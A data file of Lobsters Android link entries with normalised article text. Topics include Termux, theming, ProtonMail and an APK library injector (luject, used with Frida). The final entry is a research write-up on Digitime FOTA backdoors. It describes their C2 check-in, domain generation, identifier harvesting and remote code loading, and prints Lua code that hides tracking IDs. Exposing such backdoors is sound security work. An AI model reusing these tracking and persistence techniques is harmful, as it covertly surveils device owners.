13,Lobsters,android,Android,Android 10 to render Termux unusable,https://github.com/termux/termux-packages/wiki/Termux-and-Android-10,android render termux unusable,summary http executepermission http issue going solved http converting deb apk demo http alternate solution additional note termux android issue,summary termux target api android due http executepermission untrusted apps target android invoke exec file within app home directory execution file writable app home directory wx violation apps load binary code embedded within app apk file november termux change package management solution met requirement new android selinux policy google play rule otherwise termux longer able receive application update issue discussion http accodring test xeffyr issue may affect user running lineage o rom issue going solved android o version higher requires executable code distributed within apk file convert deb file apk format placing file jni lib directory termux application automatically detect apks map jni file prefix symbolic link termux also provide tiny package manager help deal apks solution completely met requirement new android o also help separate userspace package installation make environment much easier recovery package data readonly apt package manager removed longer usable development done http converting deb apk demo sample package obtained http alternate solution know apkbased package distribution make termux nonconvenient unusable user discussion android solution enough time provide working one got suggestion using proot binary loader extremelly ridiculous variant like rewrite package wasm none decided make pull request implementation idea also make package maintaining impossible u picking apkbased packaging variant additional note termux user updating termux compiled application compiled face execve restriction device execve restricted even sdk termux build nt work termux compiled lose access shared storage sdcard due forced scoped storage termux api command termuxstorageget used retrieving file however save file private directory used lineage o rom android based restrict execve free access storage lost anyway tested engineering eng userdebug build access procnet restricted application utility like netstat working anymore lineage o restrict termux api termuxwifienable noop termux termux api compiled target sdk termux api termuxtelephonydeviceinfo show imei android issue
14,Lobsters,android,Android,A (Mostly) Google-Free Android,https://secluded.site/a-mostly-google-free-android/,mostly googlefree android,project motivation google entire business model really quite terrible launching censored search engine china selling ai tech u military mishandling sexual assault case forcing people onto google service sheer market dominance using redmi note pro miui aospextended lineageos open gapps microg mi band gadgetbridge fdroid linguee aurora like mail awesome idea kev quirk,let put little disclaimer right beginning use mobile phone lot people mileage vary also say mostly title incredibly difficult completely remove google android though project done good job short value privacy google far privacyfriendly get information algorithm capable extrapolating given enough data downright scary google entire business model addition company really quite terrible launching censored search engine china selling ai tech u military mishandling sexual assault case forcing people onto google service sheer market dominance like google want phone redmi note pro love specifically one thing like xiaomi business model exactly google collection incredibly easy circumvent xiaomi us miui meyoueye user tracking profiling also display ad lock screen elsewhere able seriously drop price phone almost sell hardware manufacturing cost circumventing data collection easy flashing rom prefer aospextended though lineageos much simpler cleaner android experience many installation guide tell flash open gapps package others say use microg much better decided even omit last time flashed phone thus absolutely compatibility google service apps break without well break also mi band give xiaomi ability collect plethora biometric data well use app instead like gadgetbridge fdroid occasionally want proprietary apps linguee englishgerman translation get aurora rather google play mentioned apps break without google service however find solidly minority proprietary application work perfectly fine without google service microg though get push notification really big deal moving minimal mobile experience thing desktop anyway closely related disclaimer top rarely use phone anything communication open source apps listening podcasts even email client installed would mail perfectly useable expect banking application work posted part awesome idea kev quirk want participate write something every day day post link social medium hashtag
15,Lobsters,android,Android,GeckoView for Android,https://mozilla.github.io/geckoview/,geckoview android,fullfeatured suited apps browser selfcontained standard compliant using geckoview api documentation information,android offer builtin webview application hook order display web page within context app however android webview really intended building browser hence many advanced web apis disabled furthermore also moving target different phone might different version webview app support geckoview come geckoview fullfeatured geckoview designed expose entire power web application straightforward api think harnessing full power gecko engine power firefox api webviewlike easy use suited apps browser geckoview particularly suited building mobile browser embedded web engine component kind app selfcontained geckoview standalone library bundle application confident code test code actually run standard compliant like firefox geckoview offer excellent support modern web standard using geckoview api documentation information
16,Lobsters,android,Android,Refactoring Android Themes with Style: Restructuring Themes,https://ataulm.com/2020/04/30/refactoring-themes-with-style.html,refactoring android theme style restructuring theme,nick butcher chris bane developing theme style monzo ideal theme structure app theme nightmode base theme platform theme resource qualifier framework theme nick rout describing migrate appcompat materialcomponents theme renaming pruning tree android styling theme v style migrating single base theme adding platform layer creating guarded alias next check emma chris,last year nick butcher chris bane presented developing theme style droidcon berlin welcome recap theme style well best practice android theming working apply best practice android app monzo u challenge lay could make change safely time word refactor theme ideal theme structure outside look feel monzo app pretty simple dark theme light theme well light theme dark toolbar actually turned three theme theme hierarchy looked follows square represents theme arrow show theme inherit checked usage always clear screen used particular variant another used app growing fast last count around activity fragment developed android engineer spread across multiple team ship new release every week understandable got position difficult aspect two tree meant reasonably easy add themerelated bug one tree went bug fix wanted something closer structure nick chris presented single tree four layer app theme base theme platform theme framework theme one specific purpose understanding help u keep theme tidy maintainable app theme bottom app theme apply activity level thememonzolight thememonzodark app theme mostly contain value colour attribute like colorprimary colorsurface android colorbackground example android colorbackground defined navy thememonzodark offwhite thememonzolight style name thememonzolight parent basethememonzo item name android colorbackground coloroffwhite item item name coloronbackground colornavy item item name colorsurface colorwhite item item name coloronsurface colornavy item item name colorprimary coloroffwhite item item name coloronprimary colornavy item style style name thememonzodark parent basethememonzo item name android colorbackground colornavy item item name coloronbackground colorwhite item item name colorsurface colordarkgrey item item name coloronsurface colorwhite item item name colorprimary colornavy item item name coloronprimary colorwhite item style view layout reference colour attribute theme adding nightmode app becomes trivial override app theme valuesnight resource directory different set colour value base theme base theme basethememonzo override define default style view text appearance attribute layer generally contain reference specific colour instead style resource used reference attribute app theme style name basethememonzo parent platformthememonzo item name tabstyle stylewidgetmonzotablayoutlegacy item item name textinputstyle stylewidgetmonzotextinputlayout item item name toolbarstyle stylewidgetmonzotoolbar item style avoiding use hardcoded colour layer mean everything common theme go platform theme platform theme layer allows u account api specific attribute using resource qualifier specify different platform theme different version android xml version encoding resource style name parent attribute available api style style name platformthememonzo parent resource resvaluesthemesxml xml version encoding resource style name parent themematerialcomponentslightnoactionbar style name platformthememonzo parent resource work based following principle base theme depends platformthememonzo platformthememonzo defined resource bucket need versionspecific attribute instance platformthememonzo depends versionspecific theme resource eg versionspecific theme resource inherit older versionspecific resource unless minsdkversion case depend framework theme framework theme chose themematerialcomponentslightnoactionbar framework theme inherit framework theme provides lot sensible default specify everything nick rout wrote article describing migrate appcompat materialcomponents theme showcase thing get free inheriting framework theme rather creating scratch structure looking get step take help u renaming pruning tree many theme style difficult know start part difficulty lay fact clear theme used always clear style resource theme decided adopt strict naming convention help u navigate current state app first rule agreed take advantage dot notation possible reserving usage explicit parent two case declaring theme overlay want inherit attribute changing namespaces inheriting style different family made really easy see lineage theme removing indirection grouped theme family made easier reduce number theme using projectwide find replace replacing lightstatusbarlighttoolbar variant lighttoolbar light toolbar status bar ought light anyway detangling left theme made easier adopting naming prefix thememonzo app theme themeoverlaymonzo theme overlay widgetmonzo widget theme theme overlay style distinct concept android represented style resource stricter name mean resource le chance misused information difference theme style check android styling theme v style migrating single base theme although renaming resource collapsing similar theme help reduce hierarchy manageable number understandable theme still need collapse multitree setup one multiple tree mean duplicate attribute base tree problematic still issue would easy make change one forget fastest way forward merge base root app theme tree moving attribute base corresponding root app theme reparent thememonzodark thememonzolight new empty base reparenting theme introduce unexpected bug case careful check usage thememonzodark depend colourspecific attribute themematerialcomponentsdark component might changed colour reparented theme descendent themematerialcomponentslight monzo app often used light themed component theme eg dialog popup menu meant attribute overridden force light style anyway meant major regression adding platform layer got single tree possible u add platform layer help u handle specific attribute android windowlightstatusbar android windowlightnavigationbar available api respectively inform system whether status bar navigation bar light system choose provide light dark icon attribute set isolation relate android statusbarcolor android navigationbarcolor even though available older api version want set separately one instead create custom theme attribute abstraction creating guarded alias creating custom theme attribute case declaring attribute resource value resource file name format xml version encoding resource attr name preferredstatusbarcolor format color attr name preferdarkstatusbaricons format boolean resource use app theme like theme attribute style name thememonzolight parent basethememonzo item name preferredstatusbarcolor coloroffwhitedarker item item name preferdarkstatusbaricons true item style style name thememonzodark parent basethememonzo item name preferredstatusbarcolor colornavydarker item item name preferdarkstatusbaricons false item style anything except assign value attribute put platformspecific theme ensure set attribute meant coupled like android windowlightstatusbar android statusbarcolor together xml version encoding resource style name parent control whether status bar icon lightdark minsdkversion item name android windowlightstatusbar attrpreferdarkstatusbaricons item available set alongside avoid hardtoread icon item name android statusbarcolor attrpreferredstatusbarcolor item style style name platformthememonzo parent resource status bar attribute set together configurable app theme next look default style help u deduplicate code improve consistency strengthen theme check meantime please let know found post helpful comment question correction let know twitter thanks emma chris review
17,Lobsters,android,Android,A static injector of dynamic library for application,https://github.com/lanoox/luject,static injector dynamic library application,luject introduction 中文 prerequisite build installation usage example inject libfridagadgetso apk frida use frida nonrooted device development build run build run test contact backer become backer sponsor become sponsor,luject static injector dynamic library application introduction 中文 luject static injector dynamic library application support following application android apk iphoneos ipa window program supported yet linux program macos program want know please refer prerequisite xmake installed system available build installation usage luject appapk luject appipa luject libaso luject appexe luject adll luject libadylib luject bin example inject libfridagadgetso apk use frida tool dynamically analyze application detail see frida luject appapk p libtest tmplibfridagadgetso libtest library requires matching injection apk support pattern matching achieve batch injection example libtest specify p parameter defaulted batch full injection ref use frida nonrooted device development build run xmake xmake run luject input libaso libbso build run test xmake build test xmake run test contact backer thank backer become backer sponsor support project becoming sponsor logo show link website become sponsor
19,Lobsters,android,Android,"All ProtonMail apps are now open source, as Android joins the list",https://protonmail.com/blog/android-open-source/,protonmail apps open source android join list,protect keep data private web app open source io app open source bridge app open source protonvpn apps open source mean proton apps beta open source github page sec consult full audit report open source proton open sourcing code increase security apps bug bounty program activist journalist open source code contributes free internet openpgpjs gopenpgp contact protonmailcom,starting today every app use access protonmail inbox open source passed independent security audit one guiding principle transparency deserve know product protect keep data private believe level transparency way earn trust community end open source long priority proton web app open source since io app open source desktop bridge app open source protonvpn apps open source mean proton apps beta open source today add protonmail android app list code available github page part making android app open source commissioned independent security audit sec consult audit found app outstanding vulnerability also published full audit report website open source proton safety number one priority open sourcing code increase security apps allows u leverage entire security community search vulnerability discover vulnerability may eligible bug bounty program mean activist journalist rely service confident communication remain private open source code contributes free internet goal bring security privacy freedom internet strong supporter open source community maintain two open source cryptographic library openpgpjs gopenpgp make easier developer encrypt apps thus protect data cooperation among open source developer create sustain privacy tech ecosystem necessary create safer internet thank community supporting effort look forward feedback github directly via email contact protonmailcom get free secure email account protonmail also provide free vpn service protect privacy protonmail protonvpn funded community contribution would like support development effort upgrade paid plan donate thank support
20,Lobsters,android,Android,Which is better on Android: divide by 2 or shift by 1?,https://jakewharton.com/which-is-better-on-android-divide-by-two-or-shift-by-one/,better android divide shift,better android divide shift androidx collection library anyone optimize javac kotlinc methodlocal optimization art shift faster division jetpack benchmark use information save apk size issue unsigned number poweroftwo division use shift issue issue,better android divide shift april porting androidx collection library kotlin multiplatform experiment binary compatibility performance tooling different memory model data structure library use arraybased binary tree store element java code lot shift replace poweroftwo multiplication divide ported kotlin turn slightlyawkward infix operator obfuscate intent code sampled people bitwise shift v multiplicationdivision many heard anecdotal claim shift better performance everyone remained skeptical whether true assumed one compiler seen code ran cpu would handle optimizing case effort satisfy curiosity partially avoid infix bitwise operator set answer better related question go anyone optimize three major compiler code pass hit cpu javackotlinc art opportunity optimize javac class example static int multiply int value return value static int divide int value return value static int shiftleft int value return value static int shiftright int value return value java compiled javac jdk resulting bytecode displayed javap javac examplejava javap c example compiled examplejava class example static int multiply int code imul ireturn static int divide int code idiv ireturn static int shiftleft int code ishl ireturn static int shiftright int code ishr ireturn every method start load first argument value multiply divide method load constant value run imul idiv perform integer multiplication integer division respectively shift method load constant value ishl ishr integer shift left integer shift right respectively optimization know anything java unexpected javac optimizing compiler leaf majority work runtime compiler jvm aheadoftime compiler kotlinc fun multiply value int value fun divide value int value fun shiftleft value int value shl fun shiftright value int value shr kotlin compiled java bytecode kotlinc kotlin javap tool used kotlinc examplekt javap c examplekt compiled examplekt public final class examplekt public static final int multiply int code imul ireturn public static final int divide int code idiv ireturn public static final int shiftleft int code ishl ireturn public static final int shiftright int code ishr ireturn exactly output java using original jvm backend kotlin using forthcoming irbased backend via xuseir also produce output use java bytecode output kotlin example input latest built master sha time writing java jar release output examplektclass dexdump classesdex opened classesdex dex version class class descriptor lexamplekt access flag public final superclass ljavalangobject direct method lexamplekt name divide type access public static final code examplektdivide int return lexamplekt name multiply type access public static final code examplektmultiply int return lexamplekt name shiftleft type access public static final code examplektshiftleft int return lexamplekt name shiftright type access public static final code examplektshiftright int return note output slightly trimmed dalvik bytecode registerbased instead stackbased like java bytecode result method one real bytecode associated integer operation us register first argument value integer literal change behavior optimizing compiler although methodlocal optimization run need define rule order keep method removed keep allowoptimization class examplekt method rule passed pgconf also supply android apis link using lib java jar lib release pgconf rulestxt output examplektclass dexdump classesdex opened classesdex dex version class class descriptor lexamplekt access flag public final superclass ljavalangobject direct method lexamplekt name divide type access public static final code examplektdivide int return lexamplekt name multiply type access public static final code examplektmultiply int return lexamplekt name shiftleft type access public static final code examplektshiftleft int return lexamplekt name shiftright type access public static final code examplektshiftright int return exact output art use dalvik bytecode output example input art running android emulator adb push classesdex sdcardclassesdex adb shell su dexfilesdcardclassesdex oatfilesdcardclassesoat oatdump oatfilesdcardclassesoat oatdexfile lexamplekt initialized oatclassallcompiled int examplektdivide int code mov eax ecx lea edx eax test eax eax cmovnlge edx eax sar edx mov eax edx ret int examplektmultiply int code shl ecx mov eax ecx ret int examplektshiftleft int code shl ecx mov eax ecx ret int examplektshiftright int code sar ecx mov eax ecx ret note output significantly trimmed assembly reveals art indeed stepped normalized arithmetic operation use shift first multiply shiftleft exact implementation use shl left bitwise shift ofâ beyond look offset file leftmost column actually art recognized function body compiled assembly deduplicated next divide shiftright share use sar right bitwise shift ofâ four additional instruction divide precede sar handle case input negative adding value running command pixel running android show art compiles code arm assembly oatdexfile lexamplekt verified oatclassallcompiled int examplektdivide int code lsrs add asrs mov bx lr int examplektmultiply int code lsls bx lr int examplektshiftleft int code lsls bx lr int examplektshiftright int code asrs bx lr multiply shiftleft use lsls left shift deduplicated shiftright us asrs right shift divide also using asrs right shift us another right shift lsrs handle adding negative value definitively say replacing value value offer benefit stop arithmetic operation reserve strictly bitwise thing however value value still produce different assembly instruction thus presumably different performance characteristic thankfully value avoids using generic division still primarily based right shift likely far apart term performance shift faster division determine whether divide shift faster use jetpack benchmark library class divideorshifttest jvmfield rule val benchmark benchmarkrule test fun divide val value toint ensure constant var result benchmarkmeasurerepeated result value println result ensure keep computation test fun shift val value toint ensure constant var result benchmarkmeasurerepeated result value shr println result ensure keep computation device armbased pixel running android result n divideorshifttestdivide n divideorshifttestshift effectively zero difference using division versus shift number small nanosecond using negative number show difference result definitely say replacing value value offer benefit stop arithmetic operation reserve strictly bitwise thing use information save apk size given two different way express operation choose one better performance performance choose whichever result smaller apk size know value value produce assembly art thus one spaceefficient dalvik bytecode unconditionally rewrite smaller form looking output produce size bytecode lexamplekt name multiply int lexamplekt name shiftleft int gain power multiplication run bytecode space shift storing literal value value compared value lexamplekt name multiply const float mulint lexamplekt name shiftleft int filed issue investigate optimizing automatically strongly suspect case applies near zero likely worthwhile output also tell u value value cost term dalvik bytecode lexamplekt name divide int lexamplekt name shiftleft int also diverge bytecode size literal reach unconditionally replacing poweroftwo division right shift never safe behavior around negative could replacement value guaranteed nonnegative track possible range integer value time unsigned number poweroftwo division use shift java bytecode lack unsigned number emulate using signed counterpart java static helper method operating signed type unsigned value kotlin offer type like uint similar thing completely abstracted behind type conceivable using division poweroftwo could rewritten shift use kotlin model case fun javalike value int integerdivideunsigned value fun kotlinlike value uint value case look code compiled start plain kotlinc kotlin kotlinc examplekt javap c examplekt compiled examplekt public final class examplekt public static final int javalike int code invokestatic method javalangintegerdivideunsigned ii ireturn public static final int int code invokestatic method kotlinunsignedkt ii ireturn kotlin recognize poweroftwo division could use iushr bytecode filed track adding behavior using xuseir change anything except remove loadstore noise however targeting java kotlinc jvmtarget examplekt javap c examplekt compiled examplekt public final class examplekt public static final int javalike int code invokestatic method javalangintegerdivideunsigned ii ireturn public static final int int code invokestatic method javalangintegerdivideunsigned ii ireturn integerdivideunsigned method available java prefered targeting newer since make function body identical revert back old output see happens comparison next notably different invoked include kotlin stdlib input also pas minapi since integerdivideunsigned available api newer java jar lib minapi release pgconf rulestxt output examplektclass kotlinstdlibjar dexdump classesdex opened classesdex dex version class class descriptor lexamplekt access flag public final superclass ljavalangobject direct method lexamplekt name javalike type access public static final code examplektjavalike int invokestatic ljavalanginteger divideunsigned ii method moveresult return lexamplekt name type access public static final code inttolong ffff ffff constwide double int inttolong longtoint return kotlin unsigned integer division implementation inlined function convert input argument literal longs performs long division convert back int eventually run art translated equivalent going leave function behind opportunity optimization already missed java version failed replace divideunsigned call shift filed issue track last opportunity optimize case art adb push classesdex sdcardclassesdex adb shell su dexfilesdcardclassesdex oatfilesdcardclassesoat oatdump oatfilesdcardclassesoat oatdexfile lexamplekt initialized oatclassallcompiled int examplektjavalike int code test eax esp stackmap push ebp sub esp mov esp eax cmpw f stateandflags jnzne call pop ebp mov edx mov eax ebp call eax stackmap add esp pop ebp ret call f ptestsuspend stackmap ebde jmp int int code art intrinsify call divideunsigned instead get machinery jump regular method implementation filed issue track adding art intrinsics unsigned divide well certainly journey congrats made far scrolled bottom summarize art rewrite poweroftwo multiplication left shift poweroftwo division right shift extra instruction handle negative observable performance difference right shift poweroftwo division size difference dalvik bytecode shift multiplydivide nobody optimizes unsigned division yet probably using anyway fact answer title post better android divide shift neither use division arithmetic use shift actual bitwise operation switching androidx collection port shift multiply divide see next time jake wharton
21,Lobsters,android,Android,A gradle plugin that integrates xmake seamlessly,https://github.com/xmake-io/xmake-gradle,gradle plugin integrates xmake seamlessly,xmakegradle introduction 中文 prerequisite apply plugin plugins dsl legacy plugin application configuation simplest example buildgradle jni gradle configuations build build jni generate apk force rebuild jni development build plugins publish plugins http guidesgradleorgpublishingpluginstogradlepluginportal contact backer become backer sponsor become sponsor,xmakegradle gradle plugin integrates xmake seamlessly introduction 中文 xmakegradle gradle plugin integrates xmake seamlessly want know please refer prerequisite xmake installed system available apply plugin plugins dsl plugins id orgtbooxgradlexmakeplugin version legacy plugin application buildscript repository maven url http dependency classpath orgtboox repository mavencentral apply plugin orgtbooxgradlexmakeplugin configuation simplest example add xmakelua projectdirjnixmakelua enable xmake buildgradle buildgradle android externalnativebuild xmake path jnixmakelua jni jni project structure projectdir src main java jni xmakelua cpp xmakelua addrules modedebug moderelease target nativelib setkind shared addfiles nativelibcc gradle configuations android defaultconfig externalnativebuild xmake append global cflags optional cflags dtest append global cppflags optional cppflags dtest switch build mode debug xmake f debug optional buildmode debug set abi filter optional eg armeabi also get abifilters defaultconfigndkabifilters abifilters set built target target xxx yyy externalnativebuild xmake enable xmake set xmakelua project file path path jnixmakelua enable verbose output optional eg verbose warning normal loglevel verbose set cstl optional eg cstaticcshared gnustlstaticgnustlshared stlportstaticstlportshared stl cshared set given xmake program path optional program usrlocalbinxmake disable stdc library optional stdcxx false set given ndk directory path optional ndk set sdk version ndk optional sdkver build build jni generate apk xmakebuild injected assemble task automatically gradlexmakeplugin applied gradlew app assembledebug task nativelib task nativelib xmake build ccache compilingdebug nativelibcc linkingdebug libnativelibso build ok install artifact task nativelib task nativelib xmake build ccache compilingdebug nativelibcc linkingdebug libnativelibso build ok install artifact task nativelib prebuild task nativelib assemble task app assembledebug force rebuild jni gradlew nativelib xmakerebuild development build plugins gradlew gradlexmakeplugin assemble publish plugins see http guidesgradleorgpublishingpluginstogradlepluginportal gradlew gradlexmakeplugin publishplugins contact backer thank backer become backer sponsor support project becoming sponsor logo show link website become sponsor
22,Lobsters,android,Android,Privacy-Preserving Contact Tracing - Apple and Google,https://www.apple.com/covid19/contacttracing,privacypreserving contact tracing apple google,privacypreserving contact tracing,privacypreserving contact tracing across world government health authority working together find solution pandemic protect people get society back running software developer contributing crafting technical tool help combat virus save life spirit collaboration google apple announcing joint effort enable use bluetooth technology help government health agency reduce spread virus user privacy security central design part partnership google apple releasing draft documentation exposure notification system service privacypreserving contact tracing u apple google believe never important moment work together solve one pressing problem close cooperation collaboration developer government public health provider hope harness power technology help country around world slow spread accelerate return everyday life
23,Lobsters,android,Android,"Dark Sky Acquired by Apple, announced plans to shut down outside of iOS",https://blog.darksky.net/dark-sky-has-a-new-home/,dark sky acquired apple announced plan shut outside io,update update happens existing product purchase app store thank,adam grossman august update android wear o apps shut august subscriber active time receiving full refund weather forecast map dark sky website remain active adam grossman july update service existing user subscriber android app continue august point app shut subscriber active time receive full refund weather forecast map embeds available dark sky website also shut august adam grossman march today important exciting news share dark sky joined apple goal always provide world best weather information possible help many people stay dry safe way respect privacy better place accomplish goal apple thrilled opportunity reach far people far impact ever could alone happens existing product io app change dark sky io time continue available purchase app store android wear o app app longer available download service existing user subscriber continue july point app shut subscriber still active time receive refund website weather forecast map embeds continue july website remain active beyond time support api io app customer api api service existing customer changing today longer accept new signups api continue function end part transition use dark sky apple subject apple privacy policy found applecomprivacy thank customer family friend grateful support past eight year look forward continuing build great product stay dark sky team
24,Lobsters,android,Android,Researching Digitime Android Backdoors,https://wuffs.org/blog/digitime-tech-fota-backdoors,researching digitime android backdoor,researching digitime tech fota backdoor background research fota updater cosmo communicator update digitime fota updaters http systemfota april unpacking lua boot module boot c c scheduling boot c c checkin boot c c registration boot c c info boot c c upgrade boot aidl lua worker initialisation worker c c device id worker c c scheduling worker c c checkin worker c c info gathering worker c c package control worker c c backdoor foslenhance backdoor iorgx backdoor iorgy backdoor iorgz security implication malware linked digitime koodous thread xda developer next discovered similar situation ninji update http securitytrailscomdomainwwwdigitimetechcomhistorya shade grey building emulator,researching digitime tech fota backdoor published dec investigation shady stuff going behind digitime tech fota update service seen planet computer android device lowbudget android hardware background earlier month wrote research fota updater cosmo communicator wanting learn fetched update hope gleaning information device getting raw ota update file sent absurd rabbit hole went assuming good faith discover updater contained curious level obfuscation complexity thing theory simple straightforward pattern reminiscent malware attained goal writing script could pretend cosmo fetch ota data still left lot question unanswered though delved post contains everything learned digitime operation based research company currentlyoperating online service every sample could track software distribution model make difficult get sample bound aspect missed still enough information get broad overview update please see note end post detail situation progressed summary planet computer entirely unaware started internal investigation immediately notified working mitigationsalternatives digitime shenzhen digitime technology 数联时代 digitime technology company based shenzhen operates mobile device update infrastructure main website wwwdigitimetechcom boast globally leading fota service provider million device scrolling image carousel claim partnership qualcomm mediatek spreadtrum soc vendor revoview waterworld bird device manufacturer although definitely exhaustive list u page claim digitime serf hundred worldwide android terminal r company odms brand closely linked qiming iot 启明智物 深圳市启明智物科技有限公司 also advertise fota service wwwqimingiotcom contact phone number digitime even share legal representative much younger registered company guangdong province november domain name registered month later fota updaters digitime main business least public eye fota service advertise digitimetechcom aspect visible user provide android odmsoems systemfota updater apk instruction build ota package web portal upload view statistic example visible one github repo engineer erobbingluobin appears mistakenly uploaded digitime package april http includes chineselanguage documentation integrating updater system multiple version apks jellybeankitkat lollipop powerpoint presentation system systemfota april repository give u version code also code code updater fairly old still give u picture system evolved also partially obfuscated helpful analysis moreover leftover fosvcjavabak file inside apk original source code comment app partially implemented java partially lua former comfotawirelessupdateactivity package handle ui update checking download installation fota portion system quite predictable exception url hidden lua code bit later fairly standard version updater us protobufs sent endpoint checkproject check regverify upgrade upgradefinish get exciting comfotawirelessupdateactivity package includes set class interface lua runtime execute lua script four entry point lua code fosvcstartboxservice called forcv o boot network connectivity change timezone change fosvcreadfotaconfig called fotaapplicationoncreate fetch fota server url fosvcsettestcondition called forcv systemsystestaction intent received foexport binder interface lua system exposed fosvconbind fosvcstartboxservice set alarm start fosvc service every hour service start call fobootstartboot execute lua function bootentry also schedule timer perform fota check within java code two fosvc function simply redirect towards lua function bootreadfotaconfig bootsettestcondition finally although sample nt appear use foexport interface one method map callbox map call lua function bootaidl removed entirely later version unpacking lua boot module find looking fobootextractboot package stored inside extensionless zip file called armeabi contains set file containing lua bytecode lua runtime shared library later version systemfota move runtime standard apk lib subdirectory using unluac luadec get vaguely readable code file perfect part resort using luadec dis output bytecode instruction humanreadable form good enough figure going work version internally numbered also comparing aspect version shipped planet gemini pda cosmo communicator numbered firstly let look simpler function mentioned bootreadfotaconfig simply us configget fetch url single boolean flag fotaadswitch looking config script learn different url pieced together string interspersed unused junk string http appfotadigitimetechcom http http http http http gendomainname last one common practice malware generates domain based current timestamp following template bootbxxxxxxxxnet xxxxxxxx first character digest boxdomainyyyymm current year current month context config script simply provides configget configset function store variable shared preference file key string variable encrypted using encryptdata xors byte byte encodes result version present slightly different variant gemini cosmo discussed later bootversionext us different url cosmoonly fota fqdns replaced http appfotadigitimetechcom cosmoonly fota ip replaced http gemini cosmo boot fqdn replaced http geminionly boot ip replaced http dead cosmoonly boot ip replaced http next bootsettestcondition update couple configuration variable used lua code scheduling explained next section bootentry shady stuff begin initialises property within global state accessed using fetchdata storedata static method fosvc class obtained lua envget boxserviceclass start new lua handler separate thread stored using storedata boothandler call bootstart new handler bootstart query presence worker code call schedulecheck schedule checkin worker present sends boothandler handler request execute workerentry function worker separate dynamicallyupdatable package lua code meat system lie discussed later boot c c scheduling schedulecheck function mediates client check boot c c server first look value activateaccount activatecondition configuration value define activate new install activateaccount default activatecondition default value license android manifest sample value exist activateaccount activatecondition function increment activateaccount return mean code lie dormant schedulecheck called least time version neuter somewhat threshold longer multiplied default dormancy period effectively nothing following couple check network available function exit check whether enough time passed since last checkin default short interval used wifi day long interval used mobile day bypassed debugswitch configuration option version interval hour debugswitch affect go ahead checktime configuration value set current timestamp actioncheck called bootsettestcondition function mentioned earlier come set counter time variable checkin triggered immediately bypassing initial dormancy period also delay checkins boot c c checkin actioncheck quite simple function make post request booturl one attempted order succeeds containing json payload encrypted using encryptdata described earlier info sent server includes uid obtained getconfig basic information returned envinfo env script channel project id phone model rom version updater version boot version worker version present whether host app system app current network type version last two field replaced bootversionext c gemini variant identifies particular variant boot payload used pattern exists worker see later hard analyse depth without access host apk sample however difference c fota domain name one java class name host service name lua payload may unknown variant significant change field fairly selfexplanatory except channel id sometimes called customer id project id arbitrary string appear tied specific deployment within digitime infrastructure example systemfota us luobin sysluobin planet gemini us eastaeon planet cosmo us eastaeon used fota client discussed earlier lua c c client server return payload include config cmd config present value used update existing one using configset cmd present value checked determine action perform next actionregister actionupgrade actioninfo parameter pulled params key boot c c registration actionregister sends request similar fashion previous section using register action supply return envinfo also call configgetinfo get entirety data tracked config module server return payload may include new uid optional update config new uid provided stored using configset another actioncheck performed immediately without waiting next scheduled checkin boot c c info actioninfo sends request telling server information client version envinfo configgetinfo data register action sends stepped also including return phoneinfo metadata androidosbuild class phonereadtelephonyinfo identifying information imei sim phone number serial number detail current mobile network server optionally return update config two new cmd get client execute either actionregister actionupgrade immediately boot c c upgrade last command look actionupgrade params specify url worker package downloads package extract worker directory specified config module give system power although boot system fairly benign giving digitime nothing basic metric deviceidentifying data upgrade command allows supply worker package containing arbitrary lua code boot aidl slight detour look worker included mechanism allowed java code bind fosvc service retrieve interface call bootaidl function handle getuid command return configget uid command passed workeraidl function within worker lua worker worker core digitime c c client client registered device using boot module discussed send upgrade command worker download particularly insidious system digitime maintains different worker different ability mean documenting everything difficult know three variant may nt know simply guess url c c wo nt supply sample observed located shadysounding domain appear use distribute updated worker malwareadware application pushed device record various malware tracking site suggesting digitime used store longer active digitime domain name later section report every worker us external interface process different command architecture similar boot module currently know three version counting variant available following url http http http first report version two report version also workerversionext field match last character name like bootversionext field seen seems identify separate variant particular worker version different capability b worker fairly basic provides ability base boot module digitime server offered cosmo worker add interesting malwarelike behaviour discus later section initialisation worker controlled single entry point workerentry called boot module discussed earlier begin one particularly interesting piece code set various class name allowing adapt different version host android application two externally supplied variable host configures creating lua state queried boxpackagename serviceverint package name supplied default iwabox setting first row following table used otherwise check serviceverint determine kind host dealing service version boot handler service utility receiver nil package boxboot boxhandler guardservice boxutility boxreceiver nil version foboot fohandler fosvc foutility forcv foboot fohandler baseintentservice inforeceiver foboot fohandler gcmbaseintentservice gcmbroadcastreceiver foboot fohandler foboot fohandler undefined undefined similar bootentry boot module worker creates new lua thread handler store workerhandler data field service class workerstart function executed new thread workerstart quite straightforward call schedulecheck false note despite naming separate schedulecheck function present boot module none boot code accessible separate context increment callcount configuration variable schedulecheck returned true worker call misccheckretention variant immediately terminates thread also code executing debug action nt believe activated using version host seen default c c url used worker module follows three variant looked http http worker c c device id uuid module worker expose simple api uuidreaddid uuidwritedid uuidreaduuid responsible keeping track two different user id really sneaky value kept multiple different place order make harder someone remove tracking data also try detect tampering report home uuid stored globally cachelogprouuid locally packagefileslogprouuid packagesharedprefsuuidproxml uuidreaduuid function check order xml private data cache take first valid one correct none present new one generated using java uuid class missingnonmatching entry replaced function return uuid along information read string eg specifies read nothing nonmatching uuid matching uuid write string eg specifies whether writes made yes loc string specifies location uuid pulled wlog uuidreaduuid result xmluuid xmlvalid readuuidatxmlsp privuuid privvalid readuuidatprivatedata cacheuuid cachevalid readuuidatcache wlog uuidxml tostring xmluuid tostring xmlvalid wlog uuidprivate tostring privuuid tostring privvalid wlog uuidcache tostring cacheuuid tostring cachevalid xmlreadflag xmlvalid privreadflag privvalid cachereadflag cachevalid loc xmluuid whatuuid xmluuid loc x else privuuid whatuuid privuuid loc p else cacheuuid whatuuid cacheuuid loc c wlog uuid tostring whatuuid whatuuid whatuuid builduuid loc n wlog uuidloc tostring loc result loc loc whatuuid result read x tostring xmlflag p tostring privflag c tostring cacheflag return whatuuid tostring whatuuid xmlwriteflag privwriteflag cachewriteflag xmluuid whatuuid xmlreadflag else xmlwriteflag writeuuidatxmlspdata whatuuid privuuid whatuuid privreadflag else privwriteflag writeuuidatprivatedata whatuuid cacheuuid whatuuid cachereadflag else cachewriteflag writeuuidatcache whatuuid readinfo x tostring xmlreadflag p tostring privreadflag c tostring cachereadflag writeinfo x tostring xmlwriteflag p tostring privwriteflag c tostring cachewriteflag wlog uuidreadstatus tostring readinfo wlog uuidwritestatus tostring writeinfo result read readinfo result write writeinfo slightly different supplied digitime server register rather generated client expose separate uuidreaddid uuidwritedid function stored globally cachelogprodidzzzz zzzz result calling encryptdata package name output munged make safe filename replacing b c locally packagefileslogprodid packagesharedprefsdidproxml aside difference behaves almost identically uuid reader returning read write loc field also check presence 